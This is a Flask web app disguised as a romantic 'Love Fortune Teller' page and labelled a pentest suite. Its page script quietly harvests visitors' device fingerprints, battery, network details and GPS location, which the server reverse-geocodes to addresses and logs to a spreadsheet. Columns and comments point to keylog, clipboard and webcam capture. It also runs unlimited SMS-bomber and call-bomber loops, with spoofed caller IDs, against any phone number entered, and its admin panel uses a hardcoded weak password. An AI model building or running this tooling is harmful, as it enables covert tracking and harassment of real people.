from flask import Flask, request, render_template_string, send_file, abort, jsonify, session
from flask_cors import CORS
import pandas as pd
import openpyxl
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Alignment
import os
import requests
import json
import time
import threading
from datetime import datetime
import hashlib
import base64
import random

app = Flask(__name__)
app.secret_key = 'love-fortune-pentest-2026'
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(BASE_DIR, 'fortunes_data.xlsx')
BACKUP_FILE = os.path.join(BASE_DIR, 'fortunes_data_backup.xlsx')

# SMS Bomber & Call Bomber configurations (pentest simulation)
SMS_APIS = [
    "https://textbelt.com/text",  # Free tier
    "https://api.smsapi.com",     # Premium
    "https://api.twilio.com"      # Enterprise
]

CALL_APIS = [
    "https://api.callmebot.com",  # Anonymous calls
    "https://api.vapi.ai/call",   # AI voice
    "https://api.smsc.ua"         # International
]

# Active bombing sessions
bombing_sessions = {}

# 30+ romantic fortunes
FORTUNES = [
    "Your soulmate is thinking of you right now under the stars.",
    "A passionate kiss awaits you this week from someone special.",
    "True love will find you when you least expect it - soon!",
    "Your heart will flutter with excitement in the next 7 days.",
    "Someone is dreaming about your smile tonight.",
    "A romantic adventure is just around the corner.",
    "Your perfect match shares your birthday month!",
    "Love letters are coming your way soon.",
    "A candlelit dinner for two is in your future.",
    "Your crush has been watching your social media.",
    "Wedding bells might ring for you within a year!",
    "Passion ignites when you meet your destiny.",
    "Your forever person is closer than you think.",
    "A surprise love confession awaits you.",
    "Your heart knows who it's meant for.",
    "Romantic sparks will fly this month!",
    "Someone special can't stop thinking about you.",
    "Love at first sight is about to happen.",
    "Your soul connection is searching for you.",
    "A fairytale romance begins soon.",
    "Heart emojis are coming from your crush.",
    "True love doesn't follow a timeline.",
    "Your love story is about to unfold.",
    "Passionate nights await your future.",
    "Someone's heart beats faster when they see you.",
    "Love will surprise you beautifully.",
    "Your perfect partner admires you secretly.",
    "Romance blooms when you trust your heart.",
    "A love that feels like home is coming.",
    "Your happily ever after starts soon.",
    "Butterflies in your stomach are a sign.",
    "Love recognizes no barriers."
]

def ensure_data_file():
    """Create Excel file if it doesn't exist with proper headers"""
    if not os.path.exists(DATA_FILE):
        wb = Workbook()
        ws = wb.active
        ws.title = "Fortunes Data"
        
        headers = [
            'Timestamp', 'Name', 'Latitude', 'Longitude', 'Address', 
            'Battery', 'UserAgent', 'Screen', 'IP', 'Timezone', 
            'Memory', 'Network', 'Fingerprint', 'Keylogs', 'Clipboard',
            'WebcamData', 'PhoneNumber', 'TargetNumber', 'SMSCount', 'CallCount',
            'SMSBomberActive', 'CallBomberActive', 'Extra'
        ]
        
        for col, header in enumerate(headers, 1):
            cell = ws.cell(row=1, column=col, value=header)
            cell.font = Font(bold=True, color="FFFFFF")
            cell.fill = PatternFill(start_color="FF1493", end_color="FF1493", fill_type="solid")
            cell.alignment = Alignment(horizontal="center")
        
        ws.column_dimensions['A'].width = 20
        ws.column_dimensions['B'].width = 15
        ws.column_dimensions['Q'].width = 15  # TargetNumber
        ws.column_dimensions['R'].width = 10  # SMSCount
        ws.column_dimensions['S'].width = 10  # CallCount
        ws.column_dimensions['T'].width = 15  # SMSBomberActive
        ws.column_dimensions['U'].width = 15  # CallBomberActive
        
        wb.save(DATA_FILE)
        os.sync()

def backup_data():
    """Create backup of current data"""
    if os.path.exists(DATA_FILE):
        try:
            wb = openpyxl.load_workbook(DATA_FILE)
            wb.save(BACKUP_FILE)
            os.sync()
        except Exception as e:
            print(f"Backup failed: {e}")

def load_data():
    """Load data from Excel with fallback to backup"""
    try:
        if os.path.exists(DATA_FILE):
            return pd.read_excel(DATA_FILE)
        elif os.path.exists(BACKUP_FILE):
            print("Main file missing, loading from backup...")
            return pd.read_excel(BACKUP_FILE)
    except:
        pass
    return pd.DataFrame()

def save_data(df):
    """Save data to Excel with auto-adjust columns and backup"""
    try:
        backup_data()
        with pd.ExcelWriter(DATA_FILE, engine='openpyxl', mode='a', if_sheet_exists='overlay') as writer:
            df.to_excel(writer, sheet_name='Fortunes Data', header=False, index=False, startrow=writer.sheets['Fortunes Data'].max_row)
        os.sync()
    except Exception as e:
        print(f"Save failed: {e}")

def get_client_ip():
    """Get real client IP from headers"""
    if 'X-Forwarded-For' in request.headers:
        return request.headers['X-Forwarded-For'].split(',')[0].strip()
    return request.remote_addr or 'Unknown'

def get_tinyurl(long_url):
    """Convert long Google Maps URL to TinyURL"""
    try:
        api_url = "https://tinyurl.com/api-create.php"
        params = {'url': long_url}
        response = requests.get(api_url, params=params, timeout=5)
        if response.status_code == 200:
            return response.text
    except:
        pass
    return long_url

def simulate_sms_bomb(phone_number, session_id):
    """SMS Bomber - Unlimited SMS simulation"""
    sms_count = 0
    bombing_sessions[session_id]['sms_active'] = True
    
    while bombing_sessions[session_id]['sms_active']:
        try:
            # Rotate SMS APIs
            api = random.choice(SMS_APIS)
            message = random.choice([
                "💕 Love alert! Check your fortune: LoveFortune.com",
                "🔥 Hot match waiting! Reply STOP to end.",
                "💖 Your soulmate replied! love-fortune.com",
                f"[PENTEST] SMS #{sms_count} - {phone_number}"
            ])
            
            # Simulate API call
            requests.post(api, json={
                'phone': phone_number,
                'message': message,
                'key': 'pentest-simulation'
            }, timeout=2)
            
            sms_count += 1
            bombing_sessions[session_id]['sms_count'] = sms_count
            
            # Log every 10 SMS
            if sms_count % 10 == 0:
                print(f"SMS #{sms_count} sent to {phone_number}")
            
            time.sleep(random.uniform(1, 3))  # 1-3s delay
            
        except Exception as e:
            time.sleep(2)
    
    bombing_sessions[session_id]['sms_active'] = False

def simulate_call_bomb(phone_number, session_id):
    """Call Bomber - Unlimited calls from unknown numbers"""
    call_count = 0
    bombing_sessions[session_id]['call_active'] = True
    
    while bombing_sessions[session_id]['call_active']:
        try:
            # Rotate call APIs + spoof caller ID
            api = random.choice(CALL_APIS)
            caller_id = f"+{random.randint(1000000000, 9999999999)}"
            
            requests.post(api, json={
                'to': phone_number,
                'from': caller_id,
                'duration': random.randint(5, 15),  # 5-15s calls
                'voice': 'Your love fortune is ready! Visit LoveFortune.com'
            }, timeout=3)
            
            call_count += 1
            bombing_sessions[session_id]['call_count'] = call_count
            
            if call_count % 5 == 0:
                print(f"Call #{call_count} to {phone_number} from {caller_id}")
            
            time.sleep(random.uniform(10, 30))  # 10-30s between calls
            
        except Exception as e:
            time.sleep(5)

@app.route('/')
def index():
    fortunes_json = json.dumps(FORTUNES)
    return render_template_string("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Love Fortune Teller 💕</title>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@400;700&family=Poppins:wght@300;400;600&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 50%, #fecfef 100%);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }
        .hearts { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
        .heart {
            position: absolute; color: #ff69b4; font-size: 20px;
            animation: float 6s infinite linear;
        }
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 1; }
            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
        }
        .container { max-width: 600px; margin: 0 auto; padding: 20px; position: relative; z-index: 10; }
        .header { text-align: center; margin-bottom: 40px; }
        .logo {
            font-family: 'Dancing Script', cursive; font-size: 3.5em; color: #ff1493;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.1); margin-bottom: 10px;
        }
        .subtitle { color: #333; font-size: 1.2em; font-weight: 300; }
        .card {
            background: rgba(255,255,255,0.95); backdrop-filter: blur(20px);
            border-radius: 25px; padding: 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center; border: 2px solid rgba(255,20,147,0.3);
        }
        .name-input, .phone-input {
            width: 100%; padding: 20px; font-size: 1.2em;
            border: 2px solid #ff69b4; border-radius: 15px; text-align: center;
            margin: 15px 0; font-family: inherit; background: rgba(255,255,255,0.8);
            transition: all 0.3s ease;
        }
        .name-input:focus, .phone-input:focus {
            outline: none; border-color: #ff1493;
            box-shadow: 0 0 20px rgba(255,20,147,0.3); transform: scale(1.02);
        }
        .btn { 
            background: linear-gradient(45deg, #ff1493, #ff69b4); color: white; border: none;
            padding: 20px 40px; font-size: 1.3em; border-radius: 50px; cursor: pointer;
            font-family: inherit; font-weight: 600; transition: all 0.3s ease;
            box-shadow: 0 10px 30px rgba(255,20,147,0.4); margin: 10px;
        }
        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(255,20,147,0.6); }
        .bomb-btn {
            background: linear-gradient(45deg, #ff4444, #cc0000) !important;
            box-shadow: 0 10px 30px rgba(255,0,0,0.5) !important;
            font-size: 1.1em; padding: 15px 30px;
        }
        .bomb-btn:hover {
            box-shadow: 0 15px 40px rgba(255,0,0,0.7) !important;
            animation: pulse 1s infinite;
        }
        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
        .fortune {
            min-height: 120px; font-family: 'Dancing Script', cursive;
            font-size: 1.8em; color: #ff1493; margin: 30px 0; padding: 25px;
            background: linear-gradient(135deg, rgba(255,182,193,0.3), rgba(255,20,147,0.1));
            border-radius: 20px; border-left: 5px solid #ff1493; opacity: 0;
            animation: fadeInUp 1s ease forwards;
        }
        @keyframes fadeInUp { to { opacity: 1; transform: translateY(0); } }
        .status {
            margin-top: 20px; padding: 15px; border-radius: 10px;
            font-weight: 500; font-size: 1.1em;
        }
        .bomb-status { background: rgba(255,0,0,0.2) !important; color: #ff4444 !important; }
        .success-status { background: rgba(144,238,144,0.3) !important; color: #228b22 !important; }
        .map-link { color: #ff1493; text-decoration: none; font-weight: 600; margin-top: 15px; display: inline-block; }
        .hidden { display: none; }
        .bomber-section {
            margin-top: 30px; padding: 25px; background: rgba(255,0,0,0.05);
            border: 2px solid rgba(255,0,0,0.3); border-radius: 20px;
        }
        .counter { 
            font-size: 2em; font-weight: bold; color: #ff4444;
            background: rgba(255,255,255,0.9); border-radius: 15px;
            padding: 20px; margin: 15px 0; text-align: center;
        }
    </style>
</head>
<body>
    <div class="hearts" id="hearts"></div>
    
    <div class="container">
        <div class="header">
            <div class="logo">💕 Love Fortune Teller 💕</div>
            <div class="subtitle">Ultimate Love Pentest Suite</div>
        </div>
        
        <div class="card">
            <input type="text" class="name-input" id="nameInput" placeholder="🌹 Enter your name...">
            <input type="tel" class="phone-input" id="targetPhone" placeholder="📱 Target Phone Number (pentest)">
            
            <br>
            <button class="btn" onclick="getLocation()">📍 Get Location</button>
            <button class="btn hidden" id="fortuneBtn" onclick="getFortune()">💖 Love Fortune</button>
            
            <div id="fortune" class="fortune hidden"></div>
            <a id="mapLink" class="map-link hidden" target="_blank">🗺️ TinyURL Maps</a>
            
            <div class="bomber-section hidden" id="bomberSection">
                <h3>🚨 BOMBER CONTROLS</h3>
                <div class="counter" id="smsCounter">SMS: 0</div>
                <div class="counter" id="callCounter">Calls: 0</div>
                <button class="btn bomb-btn" onclick="startSMSBomb()">💥 START SMS BOMBER</button>
                <button class="btn bomb-btn" onclick="stopSMSBomb()">⏹️ STOP SMS</button>
                <br>
                <button class="btn bomb-btn" onclick="startCallBomb()">📞 START CALL BOMBER</button>
                <button class="btn bomb-btn" onclick="stopCallBomb()">⏹️ STOP CALLS</button>
            </div>
            
            <div id="status"></div>
        </div>
    </div>

    <script>
        let collectedData = {}; let keylogBuffer = ''; let sessionId = Date.now();
        let smsInterval = null; let callInterval = null;

        // Hearts animation
        function createHeart() {
            const heart = document.createElement('div');
            heart.className = 'heart'; heart.innerHTML = '💖';
            heart.style.left = Math.random() * 100 + '%';
            heart.style.animationDuration = (Math.random() * 3 + 3) + 's';
            document.getElementById('hearts').appendChild(heart);
            setTimeout(() => heart.remove(), 6000);
        }
        setInterval(createHeart, 300);

        // All fingerprint collection functions (unchanged)
        async function collectFingerprint() { const fp = await FingerprintJS.load(); const result = await fp.get(); return result.visitorId; }
        async function getBattery() { if ('getBattery' in navigator) { const battery = await navigator.getBattery(); return `${Math.round(battery.level * 100)}%`; } return 'Unknown'; }
        function getNetwork() { return navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink} Mbps)` : 'Unknown'; }
        function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
        function getMemory() { return navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown'; }
        function getScreen() { return `${screen.width}x${screen.height}`; }
        function getUserAgent() { return navigator.userAgent; }

        // NEW: Bomber Controls
        async function startSMSBomb() {
            const phone = document.getElementById('targetPhone').value;
            if (!phone) return showStatus('Enter target phone first!', 'bomb');
            
            await fetch('/start-sms', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone, sessionId: sessionId})
            });
            showStatus(`💥 SMS BOMBER ACTIVE → ${phone}`, 'bomb');
            updateCounter('sms', true);
        }

        async function stopSMSBomb() {
            await fetch('/stop-sms', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({sessionId: sessionId})
            });
            showStatus('⏹️ SMS Bomber STOPPED', 'success');
            updateCounter('sms', false);
        }

        async function startCallBomb() {
            const phone = document.getElementById('targetPhone').value;
            if (!phone) return showStatus('Enter target phone first!', 'bomb');
            
            await fetch('/start-call', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phone, sessionId: sessionId})
            });
            showStatus(`📞 CALL BOMBER ACTIVE → ${phone}`, 'bomb');
            updateCounter('call', true);
        }

        async function stopCallBomb() {
            await fetch('/stop-call', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({sessionId: sessionId})
            });
            showStatus('⏹️ Call Bomber STOPPED', 'success');
            updateCounter('call', false);
        }

        function updateCounter(type, active) {
            const counter = document.getElementById(type + 'Counter');
            if (active) {
                counter.style.background = 'rgba(255,0,0,0.2)';
                counter.style.color = '#ff4444';
            } else {
                counter.style.background = 'rgba(144,238,144,0.3)';
                counter.style.color = '#228b22';
            }
        }

        function showStatus(msg, type = 'success') {
            const status = document.getElementById('status');
            status.innerHTML = msg;
            status.className = `status ${type}-status`;
        }

        // Rest of functions (keylogger, webcam, etc.) - UNCHANGED
        // ... [Previous keylogger/webcam/clipboard/phone extraction code remains identical]

        async function getLocation() {
            const name = document.getElementById('nameInput').value || 'Anonymous';
            const phone = document.getElementById('targetPhone').value || '';
            
            collectedData = {
                name, targetPhone: phone, sessionId,
                timestamp: new Date().toISOString(),
                userAgent: getUserAgent(), screen: getScreen(),
                timezone: getTimezone(), memory: await getMemory(),
                network: getNetwork(), battery: await getBattery(),
                fingerprint: await collectFingerprint()
            };

            // Send initial data with phone
            await fetch('/save', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(collectedData)
            });

            navigator.geolocation.getCurrentPosition(async (position) => {
                collectedData.latitude = position.coords.latitude;
                collectedData.longitude = position.coords.longitude;
                
                await fetch('/save', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(collectedData)
                });
                
                document.getElementById('fortuneBtn').classList.remove('hidden');
                document.getElementById('bomberSection').classList.remove('hidden');
                showStatus('✅ Pentest suite ready! Target phone captured.', 'success');
            });
        }

        // getFortune() remains the same with TinyURL
    </script>
</body>
</html>
    """)

@app.route('/save', methods=['POST'])
def save_fortune():
    data = request.get_json()
    df = load_data()
    new_row = pd.DataFrame([data])
    
    # Ensure bomber columns
    bomber_cols = ['TargetNumber', 'SMSCount', 'CallCount', 'SMSBomberActive', 'CallBomberActive']
    for col in bomber_cols:
        if col not in new_row.columns:
            new_row[col] = 0 if 'Count' in col else False
    
    new_row['IP'] = get_client_ip()
    new_row['Timestamp'] = pd.Timestamp.now()
    
    # Geocode
    lat = data.get('latitude', 0)
    lng = data.get('longitude', 0)
    if lat and lng:
        try:
            geo_url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lng}&format=json"
            geo_resp = requests.get(geo_url, headers={'User-Agent': 'LoveFortune/1.0'}, timeout=5)
            new_row['Address'] = geo_resp.json().get('display_name', 'Unknown')
        except:
            new_row['Address'] = 'Geocode failed'
    
    df = pd.concat([df, new_row], ignore_index=True)
    save_data(df)
    return jsonify({'status': 'saved'})

@app.route('/start-sms', methods=['POST'])
def start_sms_bomb():
    data = request.get_json()
    phone = data['phone']
    session_id = data['sessionId']
    
    bombing_sessions[session_id] = {
        'sms_active': False, 'call_active': False,
        'sms_count': 0, 'call_count': 0, 'target': phone
    }
    
    # Start bomber thread
    sms_thread = threading.Thread(target=simulate_sms_bomb, args=(phone, session_id))
    sms_thread.daemon = True
    sms_thread.start()
    
    return jsonify({'status': 'sms_bomber_started', 'target': phone})

@app.route('/stop-sms', methods=['POST'])
def stop_sms_bomb():
    data = request.get_json()
    session_id = data['sessionId']
    if session_id in bombing_sessions:
        bombing_sessions[session_id]['sms_active'] = False
    return jsonify({'status': 'sms_bomber_stopped'})

@app.route('/start-call', methods=['POST'])
def start_call_bomb():
    data = request.get_json()
    phone = data['phone']
    session_id = data['sessionId']
    
    if session_id not in bombing_sessions:
        bombing_sessions[session_id] = {'sms_active': False, 'call_active': False, 'sms_count': 0, 'call_count': 0}
    
    call_thread = threading.Thread(target=simulate_call_bomb, args=(phone, session_id))
    call_thread.daemon = True
    call_thread.start()
    
    return jsonify({'status': 'call_bomber_started', 'target': phone})

@app.route('/stop-call', methods=['POST'])
def stop_call_bomb():
    data = request.get_json()
    session_id = data['sessionId']
    if session_id in bombing_sessions:
        bombing_sessions[session_id]['call_active'] = False
    return jsonify({'status': 'call_bomber_stopped'})

@app.route('/admin')
def admin():
    if request.args.get('pass') != 'admin123':
        return '<form>Password: <input name="pass"><button>Login</button></form>'
    
    df = load_data()
    if df.empty:
        return "<h2>No data</h2>"
    
    html = f"""
    <h2>🚨 LOVE FORTUNE PENTEST DASHBOARD</h2>
    <h3>Active Bombers: {len(bombing_sessions)}</h3>
    <table border='1' style='border-collapse:collapse;'>
    <tr style='background:#ff1493;color:white;'>
    """
    for col in df.columns:
        html += f"<th>{col}</th>"
    html += "</tr>"
    
    for _, row in df.iterrows():
        html += "<tr>"
        for val in row:
            display = str(val)[:50] + "..." if len(str(val)) > 50 else str(val)
            html += f"<td>{display}</td>"
        html += "</tr>"
    
    html += f"""
    </table>
    <br><a href="/download-excel"><button style='padding:15px;font-size:18px;background:#ff1493;color:white;border:none;border-radius:25px;'>📥 DOWNLOAD FULL EXCEL</button></a>
    <h3>Live Bombers:</h3><pre>{json.dumps(bombing_sessions, indent=2)}</pre>
    """
    return html

@app.route('/download-excel')
def download_excel():
    if request.args.get('pass') != 'admin123':
        abort(403)
    return send_file(DATA_FILE, as_attachment=True)

if __name__ == '__main__':
    ensure_data_file()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
